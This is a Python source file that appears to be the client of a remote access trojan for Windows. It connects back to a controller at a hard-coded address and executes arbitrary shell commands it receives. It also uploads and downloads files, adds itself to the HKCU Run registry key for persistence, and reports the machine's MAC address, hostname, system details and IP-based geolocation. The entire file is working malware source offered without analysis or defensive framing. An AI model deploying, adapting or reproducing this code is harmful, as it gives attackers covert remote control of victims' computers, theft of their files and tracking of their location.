import socket
import time
import subprocess
import os
import sys
import uuid
import requests
import json
import platform
import winreg as reg


# SEND MAC ADDRESS
def mac():
    try:
        mac = uuid.UUID(int=uuid.getnode())
        return mac
    except Exception as e:
        return e


# SEND HOSTNAME
def hostname():
    try:
        hostname = socket.getfqdn(socket.gethostname()).strip()
        return hostname
    except Exception as e:
        return e


# SEND LOCATION
def location():
    try:
        public_ip = requests.get("https://api.ipify.org/").text
        data = requests.get(
            f"https://freegeoip.app/json/{public_ip}").text

        json_data = json.loads(data)

        ip_public = json_data["ip"]
        country_code = json_data["country_code"]
        country_name = json_data["country_name"]
        region_code = json_data["region_code"]
        region_name = json_data["region_name"]
        city = json_data["city"]
        zip_code = json_data["zip_code"]
        time_zone = json_data["time_zone"]
        latitude = json_data["latitude"]
        longitude = json_data["longitude"]
        metro_code = json_data["metro_code"]

        return f"ip_pubic: {ip_public}\ncountry_code: {country_code}\ncountry_name: {country_name}\nregion_code: {region_code}\nregion_name: {region_name}\ncity: {city}\nzip_code: {zip_code}\ntime_zone: {time_zone}\nlatitude: {latitude}\nlongitude: {longitude}\nmetro_code: {metro_code}"
    except Exception as e:
        return e


# SEND MACHINE
def machine():
    try:
        return platform.system()
    except Exception as e:
        return e


# SEND CORE
def core():
    try:
        return platform.machine()
    except Exception as e:
        return e


# For Adding File To Windows Startup
def addToStartup(f_name, path):

    # Combine Path and Filename
    address = os.path.join(path, f_name)

    # Key To Change: HKEY_CURRENT_USER
    # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    # Opening Key To Make Changes
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

    # Modifiy The Key
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)

    # Closing
    reg.CloseKey(open)


# EXECUTE COMMAND GRAB
def take_command(tcp_socket, command):
    file_name = command[5:]
    file_size = os.path.getsize(file_name)

    tcp_socket.sendall(file_name.encode('utf8'))
    tcp_socket.recv(2048).decode('utf8')

    tcp_socket.sendall(str(file_size).encode('utf8'))
    tcp_socket.recv(2048).decode('utf8')

    with open(file_name, "rb") as file:
        c = 0

        start_time = time.time()
        while c < file_size:
            data = file.read(2048)
            if not (data):
                break
            tcp_socket.sendall(data)

            c += len(data)
        end_time = time.time()


# EXECUTE COMMAND TRANSFER
def transfer_command(tcp_socket, command):
    file_name = tcp_socket.recv(2048).decode('utf8')
    tcp_socket.sendall('FILE NAME OK'.encode('utf8'))

    file_size = tcp_socket.recv(2048).decode('utf8')
    tcp_socket.sendall('FILE SIZE OK'.encode('utf8'))

    with open(file_name, "wb") as file:
        c = 0

        start_time = time.time()
        while c < int(file_size):
            data = tcp_socket.recv(2048)

            if not (data):
                break
            file.write(data)

            c += len(data)
        end_time = time.time()


def take_ip_address():
    GETHOSTNAME, GETHIDDEN, IPS = socket.gethostbyname_ex(socket.gethostname())
    ARRAYHOST = ""
    for IP in IPS:
        if IP.split(".")[0] == "192":
            ARRAYHOST = IP
            return ARRAYHOST.split(".")
    return IPS[len(IPS)-1].split(".")


def socket_init():
    tcp_socket = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

    tcp_socket.settimeout(10800)

    ARRAYHOST = take_ip_address()
    HOST = f"192.168.1.20"
    PORT = 5000

    print(
        f"[+]LISTENING ON [HOST: {HOST}] AND [PORT: {PORT}][+]")

    i = 0
    while True:
        try:
            tcp_socket.connect((HOST, PORT))

            cwd = os.getcwd()
            tcp_socket.sendall(("dir:" + str(cwd)).encode('utf8'))
            print("[+]CONNECTION ESTABLISHED[+]")
            return [1, tcp_socket]

        except:
            i += 1
            if i == 10800:
                return [i]


def main():
    request = socket_init()
    i = request[0]

    if i != 10800:
        tcp_socket = request[1]
        while True:
            try:
                command = tcp_socket.recv(2048).strip().decode('utf8')

                if 'exit' in command:
                    tcp_socket.close()
                    break
                elif command.startswith('take'):
                    take_command(tcp_socket, command)
                elif 'transfer' in command:
                    transfer_command(tcp_socket, command)
                elif command.startswith('cd'):
                    dir = command[3:]

                    try:
                        os.chdir(dir)
                    except:
                        os.chdir(cwd)
                    cwd = os.getcwd()

                    tcp_socket.sendall(("dir:" + str(cwd)).encode('utf8'))
                elif command.startswith('startup'):
                    file_name = command[8:]
                    pth = os.getcwd()
                    try:
                        addToStartup(file_name, pth)

                        tcp_socket.sendall("OK".encode('utf8'))

                    except Exception as e:
                        tcp_socket.sendall(str(e).encode('utf8'))
                elif command.startswith("data.machine"):
                    tcp_socket.sendall(str(machine()).encode('utf8'))
                elif command.startswith("data.core"):
                    tcp_socket.sendall(str(core()).encode('utf8'))
                elif command.startswith("data.addr_mac"):
                    tcp_socket.sendall(str(mac()).encode('utf8'))
                elif command.startswith("data.hostname"):
                    tcp_socket.sendall(str(hostname()).encode('utf8'))
                elif command.startswith("data.location"):
                    tcp_socket.sendall(str(location()).encode('utf8'))
                else:
                    CMD = subprocess.Popen(
                        command.split(" "), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)

                    CMD.poll()
                    stdout, stderr = CMD.communicate()

                    tcp_socket.sendall(bytes(f"{stdout}", "utf8"))
                    tcp_socket.sendall(bytes(f"{stderr}", "utf8"))

                    if (stdout == b'' and stderr == b''):
                        tcp_socket.sendall("OK".encode('utf8'))
            except Exception as e:
                tcp_socket.sendall(str(e).encode('utf8'))


if __name__ == "__main__":
    main()
